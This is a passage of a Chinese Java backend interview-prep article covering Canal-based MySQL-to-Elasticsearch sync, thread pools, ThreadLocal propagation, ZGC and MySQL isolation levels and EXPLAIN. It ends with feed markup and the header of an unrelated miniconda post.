<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a2f659270ce64af8b0bb85cbbdab84cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765863580&amp;x-signature=AP%2Frokz%2BziAw%2Bcl4VZes1soerLo%3D" alt="Redis Sentinel 监控 Redis 节点实现高可用" loading="lazy"/></p>
<h3 data-id="heading-5">MySQL 同步 ES 的实现</h3>
<p>使用 Canal 可以做到业务代码完全解耦，API 完全解耦，零代码实现准实时同步, Canal 通过解析 MySQL 的 binlog 日志文件进行数据同步。</p>
<p>Canal 的原理本质上是 <strong>模拟了 MySQL 的主从复制协议</strong> ：</p>
<ol>
<li><strong>伪装成从库 (Slave)：</strong> Canal Server 会向 MySQL Master 发送和标准 MySQL Slave 完全一样的握手包，将自己伪装成一个从库。</li>
<li><strong>订阅 Binlog：</strong> MySQL Master 验证通过后，就会把它当成一个真正的从库。从 Canal 指定的位点（Position 或 GTID）开始，持续地、流式地把二进制日志（Binlog）推送给 Canal。Binlog 记录了数据库中所有的数据变更操作（INSERT, UPDATE, DELETE）。</li>
<li><strong>解析与投递：</strong> Canal 接收到这些原始的二进制日志流后，会在内部进行解析，将它们转换成结构化的、易于消费的数据格式（比如JSON）。最后，再将这些结构化的变更事件投递出去，通常是投递到像 Kafka 或 RocketMQ 这样的消息队列中，由下游的消费程序（比如我们的同步服务）订阅并写入到 Elasticsearch。</li>
</ol>
<p>不过，Canal 仅仅支持增量同步。实际项目中，可以借助全量导入工具实现全量同步，例如 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2FDataX" target="_blank" title="https://github.com/alibaba/DataX" ref="nofollow noopener noreferrer">Datax</a> ，后续再通过 Canal 实现增量同步，相对比较麻烦。</p>
<p>为了进一步提高系统性能和可维护性，我们通常会引入消息队列 (MQ) 作为中间层，解耦 Canal 和 Elasticsearch，</p>
<p>引入 MQ 的优势:</p>
<ul>
<li><strong>异步处理:</strong> Canal 将数据变更消息发送到 MQ 后，无需等待 ES 处理完成即可返回，提高 Canal 的吞吐量。</li>
<li><strong>流量控制:</strong> MQ 作为缓冲区，可以削峰填谷，避免 Elasticsearch 瞬时写入压力过大。</li>
<li><strong>数据处理:</strong> 可以在消费 MQ 消息的过程中进行数据清洗、转换等操作，例如数据格式化、字段映射等。</li>
<li><strong>系统解耦:</strong> Canal 和 Elasticsearch 之间不再直接依赖，提高系统的可扩展性和可维护性。</li>
</ul>
<p>引入 MQ 后，MySQL 数据同步到 Elasticsearch 的流程如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b078b65f78a484794e2cda1af5a6a7f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765863580&amp;x-signature=6hBJKgojM5vVdJ9ib4cGH%2B4yZNE%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>监听解析:</strong> Canal 读取 binlog，解析变更事件。</li>
<li><strong>发送消息:</strong> Canal 将事件封装成消息发送到 MQ。</li>
<li><strong>消费消息:</strong> 消费端监听 MQ，获取变更消息。</li>
<li><strong>同步数据:</strong> 消费端处理消息，更新 Elasticsearch 索引。</li>
</ol>
<p>Canal 从 1.1.1 版本开始，默认支持将接收到的 binlog 数据直接投递到 MQ，简化了集成流程。 你只需要配置 Canal 连接 MQ 的相关信息，即可实现 Canal 与 MQ 的联动。</p>
<h3 data-id="heading-6">项目难点是什么？</h3>
<p><strong>STAR 法则</strong> 是介绍项目经验的黄金法则：</p>
<ul>
<li><strong>Situation (背景):</strong> “我参与的项目是 X（比如，一个电商秒杀系统/一个内容推荐平台/一个内部管理系统）。这个项目的主要目标是解决 Y 问题（比如，应对高并发抢购/提升用户点击率/提高管理效率）。”</li>
<li><strong>Task (任务):</strong> “我在其中主要负责 Z 模块（比如，订单处理模块/推荐算法实现/权限管理部分）的开发和维护。”</li>
<li><strong>Action (行动 - 重点讲难点和解决):</strong> “项目中遇到的一个主要挑战是 A（比如，秒杀场景下的库存超卖问题/推荐接口响应时间过长/复杂的权限校验逻辑）。为了解决这个问题，我/我们采取了以下措施：1.（比如，引入 Redis 分布式锁控制库存扣减的原子性）；2.（比如，对推荐算法进行优化，并使用缓存减少计算量）；3.（比如，设计了基于角色的访问控制模型 RBAC，并进行了细粒度的权限设计）。我具体做了 B（比如，负责锁方案的调研和编码实现/优化了部分算法逻辑/设计并实现了权限校验的核心代码）。”</li>
<li><strong>Result (结果):</strong> “通过这些努力，我们成功解决了 A 问题，最终效果是 C（比如，秒杀成功率提升了 X%，接口 RT 降低了 Y ms，系统安全性得到了保障），项目也顺利上线/达到了预期目标。通过这个项目，我深入学习了 D 技术（比如，分布式锁的应用/性能调优方法/复杂业务逻辑的设计），也提升了 E 能力（比如，解决复杂问题的能力/团队协作能力）。”</li>
</ul>
<p>针对自己简历上的每个项目，至少准备 1-2 个有技术含量或业务复杂度的难点，想清楚解决过程和结果。不要只说功能实现，要突出技术选型、优化思路和遇到的挑战。</p>
<h2 data-id="heading-7">Java</h2>
<h3 data-id="heading-8">为什么要用线程池？</h3>
<p>池化技术想必大家已经屡见不鲜了，线程池、数据库连接池、HTTP 连接池等等都是对这个思想的应用。池化技术的思想主要是为了减少每次获取资源的消耗，提高对资源的利用率。</p>
<p>线程池提供了一种限制和管理资源（包括执行一个任务）的方式。 每个线程池还维护一些基本统计信息，例如已完成任务的数量。使用线程池主要带来以下几个好处：</p>
<ol>
<li><strong>降低资源消耗</strong>：线程池里的线程是可以重复利用的。一旦线程完成了某个任务，它不会立即销毁，而是回到池子里等待下一个任务。这就避免了频繁创建和销毁线程带来的开销。</li>
<li><strong>提高响应速度</strong>：因为线程池里通常会维护一定数量的核心线程（或者说“常驻工人”），任务来了之后，可以直接交给这些已经存在的、空闲的线程去执行，省去了创建线程的时间，任务能够更快地得到处理。</li>
<li><strong>提高线程的可管理性</strong>：线程池允许我们统一管理池中的线程。我们可以配置线程池的大小（核心线程数、最大线程数）、任务队列的类型和大小、拒绝策略等。这样就能控制并发线程的总量，防止资源耗尽，保证系统的稳定性。同时，线程池通常也提供了监控接口，方便我们了解线程池的运行状态（比如有多少活跃线程、多少任务在排队等），便于调优。</li>
</ol>
<h3 data-id="heading-9">内置线程池用过吗？</h3>
<p>在《阿里巴巴 Java 开发手册》“并发处理”这一章节，明确指出线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。</p>
<p><strong>为什么呢？</strong></p>
<blockquote>
<p>使用线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源开销，解决资源不足的问题。如果不使用线程池，有可能会造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。</p>
</blockquote>
<p>另外，《阿里巴巴 Java 开发手册》中强制线程池不允许使用 <code>Executors</code> 去创建，而是通过 <code>ThreadPoolExecutor</code> 构造函数的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险</p>
<p><code>Executors</code> 返回线程池对象的弊端如下(后文会详细介绍到)：</p>
<ul>
<li><code>FixedThreadPool</code> 和 <code>SingleThreadExecutor</code>:使用的是阻塞队列 <code>LinkedBlockingQueue</code>，任务队列最大长度为 <code>Integer.MAX_VALUE</code>，可以看作是无界的，可能堆积大量的请求，从而导致 OOM。</li>
<li><code>CachedThreadPool</code>:使用的是同步队列 <code>SynchronousQueue</code>, 允许创建的线程数量为 <code>Integer.MAX_VALUE</code> ，如果任务数量过多且执行速度较慢，可能会创建大量的线程，从而导致 OOM。</li>
<li><code>ScheduledThreadPool</code> 和 <code>SingleThreadScheduledExecutor</code>:使用的无界的延迟阻塞队列<code>DelayedWorkQueue</code>，任务队列最大长度为 <code>Integer.MAX_VALUE</code>,可能堆积大量的请求，从而导致 OOM。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ExecutorService <span class="hljs-title function_">newFixedThreadPool</span><span class="hljs-params">(<span class="hljs-type">int</span> nThreads)</span> {
    <span class="hljs-comment">// LinkedBlockingQueue 的默认长度为 Integer.MAX_VALUE，可以看作是无界的</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(nThreads, nThreads,<span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;());

}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ExecutorService <span class="hljs-title function_">newSingleThreadExecutor</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// LinkedBlockingQueue 的默认长度为 Integer.MAX_VALUE，可以看作是无界的</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FinalizableDelegatedExecutorService</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<span class="hljs-number">0L</span>, TimeUnit.MILLISECONDS,<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;()));

}

<span class="hljs-comment">// 同步队列 SynchronousQueue，没有容量，最大线程数是 Integer.MAX_VALUE`</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ExecutorService <span class="hljs-title function_">newCachedThreadPool</span><span class="hljs-params">()</span> {

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(<span class="hljs-number">0</span>, Integer.MAX_VALUE,<span class="hljs-number">60L</span>, TimeUnit.SECONDS,<span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;Runnable&gt;());

}

<span class="hljs-comment">// DelayedWorkQueue（延迟阻塞队列）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ScheduledExecutorService <span class="hljs-title function_">newScheduledThreadPool</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScheduledThreadPoolExecutor</span>(corePoolSize);
}
<span class="hljs-keyword">public</span> <span class="hljs-title function_">ScheduledThreadPoolExecutor</span><span class="hljs-params">(<span class="hljs-type">int</span> corePoolSize)</span> {
    <span class="hljs-built_in">super</span>(corePoolSize, Integer.MAX_VALUE, <span class="hljs-number">0</span>, NANOSECONDS,
          <span class="hljs-keyword">new</span> <span class="hljs-title class_">DelayedWorkQueue</span>());
}
</code></pre>
<h3 data-id="heading-10">线程池处理任务的流程是？</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db2955176eeb41c2b346617cd6b67da0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765863580&amp;x-signature=3ZtTH4KLnGzz9jjiUcX6VzSQZtM%3D" alt="图解线程池实现原理" loading="lazy"/></p>
<ol>
<li>如果当前运行的线程数小于核心线程数，那么就会新建一个线程来执行任务。</li>
<li>如果当前运行的线程数等于或大于核心线程数，但是小于最大线程数，那么就把该任务放入到任务队列里等待执行。</li>
<li>如果向任务队列投放任务失败（任务队列已经满了），但是当前运行的线程数是小于最大线程数的，就新建一个线程来执行任务。</li>
<li>如果当前运行的线程数已经等同于最大线程数了，新建线程将会使当前运行的线程超出最大线程数，那么当前任务会被拒绝，拒绝策略会调用<code>RejectedExecutionHandler.rejectedExecution()</code>方法。</li>
</ol>
<p>再提一个有意思的小问题：<strong>线程池在提交任务前，可以提前创建线程吗？</strong></p>
<p>答案是可以的！<code>ThreadPoolExecutor</code> 提供了两个方法帮助我们在提交任务之前，完成核心线程的创建，从而实现线程池预热的效果：</p>
<ul>
<li><code>prestartCoreThread()</code>:启动一个线程，等待任务，如果已达到核心线程数，这个方法返回 false，否则返回 true；</li>
<li><code>prestartAllCoreThreads()</code>:启动所有的核心线程，并返回启动成功的核心线程数。</li>
</ul>
<h3 data-id="heading-11">如何跨线程传递 ThreadLocal 的值？</h3>
<p>由于 <code>ThreadLocal</code> 的变量值存放在 <code>Thread</code> 里，而父子线程属于不同的 <code>Thread</code> 的。因此在异步场景下，父子线程的 <code>ThreadLocal</code> 值无法进行传递。</p>
<p>如果想要在异步场景下传递 <code>ThreadLocal</code> 值，有两种解决方案：</p>
<ul>
<li><code>InheritableThreadLocal</code> ：<code>InheritableThreadLocal</code> 是 JDK1.2 提供的工具，继承自 <code>ThreadLocal</code> 。使用 <code>InheritableThreadLocal</code> 时，会在创建子线程时，令子线程继承父线程中的 <code>ThreadLocal</code> 值，但是无法支持线程池场景下的 <code>ThreadLocal</code> 值传递。</li>
<li><code>TransmittableThreadLocal</code> ： <code>TransmittableThreadLocal</code> （简称 TTL） 是阿里巴巴开源的工具类，继承并加强了<code>InheritableThreadLocal</code>类，可以在线程池的场景下支持 <code>ThreadLocal</code> 值传递。项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falibaba%2Ftransmittable-thread-local%25E3%2580%2582" target="_blank" title="https://github.com/alibaba/transmittable-thread-local%E3%80%82" ref="nofollow noopener noreferrer">github.com/alibaba/tra…</a></li>
</ul>
<h4 data-id="heading-12">InheritableThreadLocal 原理</h4>
<p><code>InheritableThreadLocal</code> 实现了创建异步线程时，继承父线程 <code>ThreadLocal</code> 值的功能。该类是 JDK 团队提供的，通过改造 JDK 源码包中的 <code>Thread</code> 类来实现创建线程时，<code>ThreadLocal</code> 值的传递。</p>
<p><strong><code>InheritableThreadLocal</code> 的值存储在哪里？</strong></p>
<p>在 <code>Thread</code> 类中添加了一个新的 <code>ThreadLocalMap</code> ，命名为 <code>inheritableThreadLocals</code> ，该变量用于存储需要跨线程传递的 <code>ThreadLocal</code> 值。如下：</p>
<pre><code class="hljs language-JAVA" lang="JAVA"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    ThreadLocal.<span class="hljs-type">ThreadLocalMap</span> <span class="hljs-variable">threadLocals</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    ThreadLocal.<span class="hljs-type">ThreadLocalMap</span> <span class="hljs-variable">inheritableThreadLocals</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
}
</code></pre>
<p><strong>如何完成 <code>ThreadLocal</code> 值的传递？</strong></p>
<p>通过改造 <code>Thread</code> 类的构造方法来实现，在创建 <code>Thread</code> 线程时，拿到父线程的 <code>inheritableThreadLocals</code> 变量赋值给子线程即可。相关代码如下：</p>
<pre><code class="hljs language-JAVA" lang="JAVA"><span class="hljs-comment">// Thread 的构造方法会调用 init() 方法</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(<span class="hljs-comment">/* ... */</span>)</span> {
  <span class="hljs-comment">// 1、获取父线程</span>
    <span class="hljs-type">Thread</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> currentThread();
    <span class="hljs-comment">// 2、将父线程的 inheritableThreadLocals 赋值给子线程</span>
    <span class="hljs-keyword">if</span> (inheritThreadLocals &amp;&amp; parent.inheritableThreadLocals != <span class="hljs-literal">null</span>)
        <span class="hljs-built_in">this</span>.inheritableThreadLocals =
          ThreadLocal.createInheritedMap(parent.inheritableThreadLocals);
}
</code></pre>
<h4 data-id="heading-13">TransmittableThreadLocal 原理</h4>
<p>JDK 默认没有支持线程池场景下 <code>ThreadLocal</code> 值传递的功能，因此阿里巴巴开源了一套工具 <code>TransmittableThreadLocal</code> 来实现该功能。</p>
<p>阿里巴巴无法改动 JDK 的源码，因此他内部通过 <strong>装饰器模式</strong> 在原有的功能上做增强，以此来实现线程池场景下的 <code>ThreadLocal</code> 值传递。</p>
<p>TTL 改造的地方有两处：</p>
<ul>
<li>实现自定义的 <code>Thread</code> ，在 <code>run()</code> 方法内部做 <code>ThreadLocal</code> 变量的赋值操作。</li>
<li>基于 <strong>线程池</strong> 进行装饰，在 <code>execute()</code> 方法中，不提交 JDK 内部的 <code>Thread</code> ，而是提交自定义的 <code>Thread</code> 。</li>
</ul>
<p>如果想要查看相关源码，可以引入 Maven 依赖进行下载。</p>
<pre><code class="hljs language-XML" lang="XML"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>transmittable-thread-local<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.12.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-14">应用场景</h4>
<ol>
<li><strong>压测流量标记</strong>： 在压测场景中，使用 <code>ThreadLocal</code> 存储压测标记，用于区分压测流量和真实流量。如果标记丢失，可能导致压测流量被错误地当成线上流量处理。</li>
<li><strong>上下文传递</strong>：在分布式系统中，传递链路追踪信息（如 Trace ID）或用户上下文信息。</li>
</ol>
<p>更多 Java  高频知识点和面试题，可以阅读笔者写的这几篇文章：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fjava%2Fconcurrent%2Fjava-concurrent-questions-01.html" target="_blank" title="https://javaguide.cn/java/concurrent/java-concurrent-questions-01.html" ref="nofollow noopener noreferrer">Java并发常见面试题总结（上）</a>（多线程基础知识，例如线程和进程的概念、死锁）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fjava%2Fconcurrent%2Fjava-concurrent-questions-02.html" target="_blank" title="https://javaguide.cn/java/concurrent/java-concurrent-questions-02.html" ref="nofollow noopener noreferrer">Java并发常见面试题总结（中）</a>（各种锁，例如乐观锁和悲观锁、<code>synchronized</code>关键字、<code>ReentrantLock</code>）</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fjava%2Fconcurrent%2Fjava-concurrent-questions-03.html" target="_blank" title="https://javaguide.cn/java/concurrent/java-concurrent-questions-03.html" ref="nofollow noopener noreferrer">Java并发常见面试题总结（下）</a>(<code>ThreadLocal</code>、线程池、<code>Future</code>、AQS、虚拟线程等)</li>
</ul>
<h3 data-id="heading-15">列举你知道的垃圾收集器</h3>
<p>Serial、Serial Old、ParNew、Parallel Scavenge、Parallel Old、CMS、G1、ZGC。</p>
<h3 data-id="heading-16">ZGC 是默认的吗？</h3>
<p>ZGC 在 Java11 中引入，处于试验阶段。经过多个版本的迭代，不断的完善和修复问题，ZGC 在 Java15 已经可以正式使用了。</p>
<p>不过，默认的垃圾回收器依然是 G1。你可以通过下面的参数启用 ZGC：</p>
<pre><code class="hljs language-bash" lang="bash">java -XX:+UseZGC className
</code></pre>
<p>在 Java21 中，引入了分代 ZGC，暂停时间可以缩短到 1 毫秒以内。</p>
<p>你可以通过下面的参数启用分代 ZGC：</p>
<pre><code class="hljs language-bash" lang="bash">java -XX:+UseZGC -XX:+ZGenerational className
</code></pre>
<h2 data-id="heading-17">MySQL</h2>
<h3 data-id="heading-18">不可重复读</h3>
<p>不可重复读（Unrepeatable read）指在一个事务内多次读同一数据。在这个事务还没有结束时，另一个事务也访问该数据。那么，在第一个事务中的两次读数据之间，由于第二个事务的修改导致第一个事务两次读取的数据可能不太一样。这就发生了在一个事务内两次读到的数据是不一样的情况，因此称为不可重复读。</p>
<p>例如：事务 1 读取某表中的数据 A=20，事务 2 也读取 A=20，事务 1 修改 A=A-1，事务 2 再次读取 A =19，此时读取的结果和第一次读取的结果不同。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ccc92883de374eb0bbfdca5f584cbca6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765863580&amp;x-signature=g9tuIBAzFZhzI10Uas3YNn6bP1I%3D" alt="不可重复读" loading="lazy"/></p>
<h3 data-id="heading-19">不可重复读和幻读有什么区别？</h3>
<ul>
<li>不可重复读的重点是内容修改或者记录减少比如多次读取一条记录发现其中某些记录的值被修改；</li>
<li>幻读的重点在于记录新增比如多次执行同一条查询语句（DQL）时，发现查到的记录增加了。</li>
</ul>
<p>幻读其实可以看作是不可重复读的一种特殊情况，单独把幻读区分出来的原因主要是解决幻读和不可重复读的方案不一样。</p>
<p>举个例子：执行 <code>delete</code> 和 <code>update</code> 操作的时候，可以直接对记录加锁，保证事务安全。而执行 <code>insert</code> 操作的时候，由于记录锁（Record Lock）只能锁住已经存在的记录，为了避免插入新记录，需要依赖间隙锁（Gap Lock）。也就是说执行 <code>insert</code> 操作的时候需要依赖 Next-Key Lock（Record Lock+Gap Lock） 进行加锁来保证不出现幻读。</p>
<h3 data-id="heading-20">InnoDB 的 REPEATABLE READ 隔离级别能解决幻读吗？</h3>
<p>标准的 SQL 隔离级别定义里，REPEATABLE READ 是无法防止幻读的。但 InnoDB 的实现通过以下机制很大程度上避免了幻读：</p>
<ul>
<li><strong>快照读 (Snapshot Read)</strong>:普通的 SELECT 语句，通过 <strong>MVCC</strong> 机制实现。事务启动时创建一个数据快照，后续的快照读都读取这个版本的数据，从而避免了看到其他事务新插入的行（幻读）或修改的行（不可重复读）。</li>
<li><strong>当前读 (Current Read)</strong>:像 <code>SELECT ... FOR UPDATE</code>, <code>SELECT ... LOCK IN SHARE MODE</code>, <code>INSERT</code>, <code>UPDATE</code>, <code>DELETE</code> 这些操作。InnoDB 使用 <strong>Next-Key Lock</strong> 来锁定扫描到的索引记录及其间的范围（间隙），防止其他事务在这个范围内插入新的记录，从而避免幻读。Next-Key Lock 是行锁（Record Lock）和间隙锁（Gap Lock）的组合。</li>
</ul>
<h3 data-id="heading-21">如何分析 SQL 性能?</h3>
<p>我们可以使用 <code>EXPLAIN</code> 命令来分析 SQL 的 <strong>执行计划</strong> 。执行计划是指一条 SQL 语句在经过 MySQL 查询优化器的优化会后，具体的执行方式。</p>
<p><code>EXPLAIN</code> 并不会真的去执行相关的语句，而是通过 <strong>查询优化器</strong> 对语句进行分析，找出最优的查询方案，并显示对应的信息。</p>
<p><code>EXPLAIN</code> 适用于 <code>SELECT</code>, <code>DELETE</code>, <code>INSERT</code>, <code>REPLACE</code>, 和 <code>UPDATE</code>语句，我们一般分析 <code>SELECT</code> 查询较多。</p>
<p>我们这里简单来演示一下 <code>EXPLAIN</code> 的使用。</p>
<p><code>EXPLAIN</code> 的输出格式如下：</p>
<pre><code class="hljs language-sql" lang="sql">mysql<span class="hljs-operator">&gt;</span> EXPLAIN <span class="hljs-keyword">SELECT</span> `score`,`name` <span class="hljs-keyword">FROM</span> `cus_order` <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> `score` <span class="hljs-keyword">DESC</span>;
<span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-----------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span>
<span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> select_type <span class="hljs-operator">|</span> <span class="hljs-keyword">table</span>     <span class="hljs-operator">|</span> partitions <span class="hljs-operator">|</span> type <span class="hljs-operator">|</span> possible_keys <span class="hljs-operator">|</span> key  <span class="hljs-operator">|</span> key_len <span class="hljs-operator">|</span> <span class="hljs-keyword">ref</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">rows</span>   <span class="hljs-operator">|</span> filtered <span class="hljs-operator">|</span> Extra          <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-----------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span>
<span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> SIMPLE      <span class="hljs-operator">|</span> cus_order <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>       <span class="hljs-operator">|</span> <span class="hljs-keyword">ALL</span>  <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>          <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span> <span class="hljs-operator">|</span> <span class="hljs-number">997572</span> <span class="hljs-operator">|</span>   <span class="hljs-number">100.00</span> <span class="hljs-operator">|</span> <span class="hljs-keyword">Using</span> filesort <span class="hljs-operator">|</span>
<span class="hljs-operator">+</span><span class="hljs-comment">----+-------------+-----------+------------+------+---------------+------+---------+------+--------+----------+----------------+</span>
<span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span>, <span class="hljs-number">1</span> warning (<span class="hljs-number">0.00</span> sec)
</code></pre>
<p>各个字段的含义如下：</p>

























































<table><thead><tr><th><strong>列名</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>id</td><td>SELECT 查询的序列标识符</td></tr><tr><td>select_type</td><td>SELECT 关键字对应的查询类型</td></tr><tr><td>table</td><td>用到的表名</td></tr><tr><td>partitions</td><td>匹配的分区，对于未分区的表，值为 NULL</td></tr><tr><td>type</td><td>表的访问方法</td></tr><tr><td>possible_keys</td><td>可能用到的索引</td></tr><tr><td>key</td><td>实际用到的索引</td></tr><tr><td>key_len</td><td>所选索引的长度</td></tr><tr><td>ref</td><td>当使用索引等值查询时，与索引作比较的列或常量</td></tr><tr><td>rows</td><td>预计要读取的行数</td></tr><tr><td>filtered</td><td>按表条件过滤后，留存的记录数的百分比</td></tr><tr><td>Extra</td><td>附加信息</td></tr></tbody></table>
<p>更多 MySQL 高频知识点和面试题总结，可以阅读笔者写的这篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fjavaguide.cn%2Fdatabase%2Fmysql%2Fmysql-questions-01.html" target="_blank" title="https://javaguide.cn/database/mysql/mysql-questions-01.html" ref="nofollow noopener noreferrer">MySQL 常见面试题总结</a>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[python]miniconda(安装)]]></title>    <link>https://juejin.cn/post/7581324707481518121</link>    <guid>https://juejin.cn/post/7581324707481518121</guid>    <pubDate>2025-12-09T05:05:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324707481518121" data-draft-id="7581408984415617043" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[python]miniconda(安装)"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T05:05:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="import_random"/> <meta itemprop="url" content="https://juejin.cn/user/2013961033882312"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [python]miniconda(安装)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2013961033882312/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    import_random
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:05:44.000Z" title="Tue Dec 09 2025 05:05:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
